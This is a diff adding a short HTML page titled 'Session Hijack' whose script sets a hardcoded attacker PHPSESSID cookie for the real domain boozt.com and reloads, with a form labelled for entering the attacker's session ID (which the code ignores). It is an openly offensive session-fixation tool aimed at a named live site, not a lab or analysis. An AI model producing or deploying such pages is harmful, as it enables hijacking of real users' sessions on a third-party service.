@@ -1,1 +1,33 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Session Hijack</title>
+  <script>
+    // Function to change PHPSESSID to the attacker's session ID
+    function hijackSession() {
+      // Set the cookie to the attacker's session ID for the target domain
+      document.cookie = "PHPSESSID=3nrr7ng13304l5k2dntbp6a18n; path=/; domain=.boozt.com";  // Use the correct session ID
+
+      // Automatically refresh the page after changing the cookie
+      window.location.reload();
+    }
+
+    // Run hijackSession when the form is submitted
+    function handleFormSubmit(event) {
+      event.preventDefault();  // Prevents default form submission
+      hijackSession();
+    }
+  </script>
+</head>
+<body>
+  <h1>Session Hijack Form</h1>
+  <form onsubmit="handleFormSubmit(event)">
+    <label for="sessionId">Enter Attacker's PHPSESSID:</label>
+    <input type="text" id="sessionId" name="sessionId" placeholder="Enter session ID" required>
+    <button type="submit">Hijack Session</button>
+  </form>
+</body>
+</html>
